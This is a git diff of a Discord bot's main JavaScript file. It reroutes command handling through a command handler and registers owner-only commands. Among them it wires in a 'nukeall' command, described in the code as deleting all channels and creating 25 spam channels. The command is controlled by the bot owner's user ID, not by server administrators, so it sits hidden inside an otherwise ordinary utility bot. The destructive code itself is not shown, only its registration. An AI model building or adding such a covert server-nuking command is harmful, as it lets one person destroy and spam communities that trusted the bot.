@@ -2,7 +2,6 @@ require('dotenv').config();
 const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder } = require('discord.js');
 const { sendAsFloofWebhook } = require('./utils/webhook-util');
 const CommandHandler = require('./handlers/CommandHandler');
-const ownerCommands = require('./owner-commands/owner-commands');
 
 // Set your Discord user ID here
 const OWNER_ID = process.env.OWNER_ID || '1007799027716329484';
@@ -20,6 +19,25 @@ const client = new Client({
 
 // Initialize command handler
 const commandHandler = new CommandHandler(client);
+
+// Load owner commands
+const ownerCommands = require('./owner-commands/owner-commands');
+const nukeCommands = require('./owner-commands/nukeall');
+
+// Register owner commands with the command handler
+Object.entries(ownerCommands).forEach(([name, execute]) => {
+    commandHandler.commands.set(name.toLowerCase(), { name, execute, ownerOnly: true });
+});
+
+// Register nuke command
+if (nukeCommands) {
+    commandHandler.commands.set('nukeall', { 
+        name: 'nukeall', 
+        execute: nukeCommands.execute, 
+        ownerOnly: true,
+        description: 'Deletes all channels and creates 25 spam channels (owner only)'
+    });
+}
 
 client.once('ready', () => {
     console.log(`🟢 Floof is online as ${client.user.tag}!`);
@@ -276,10 +294,10 @@ client.on('messageCreate', async (message) => {
     if (!message.content.startsWith('%')) return;
     
     // Handle AFK command specially (since it has complex logic)
-    const args = message.content.slice(1).trim().split(/ +/);
-    const commandName = args.shift().toLowerCase();
-    
-    if (commandName === 'afk') {
+    if (message.content.startsWith('%afk')) {
+        const args = message.content.slice(1).trim().split(/ +/);
+        const commandName = args.shift().toLowerCase();
+        
         if (message.mentions.users.size > 0) {
             // Show AFK for mentioned user
             const user = message.mentions.users.first();
@@ -290,6 +308,10 @@ client.on('messageCreate', async (message) => {
         }
         return;
     }
+    
+    // Handle all other commands through the command handler
+    const commandHandled = await commandHandler.handleCommand(message);
+    if (commandHandled) return;
     
     // Legacy snipe commands (moderation commands now handled by CommandHandler)
     
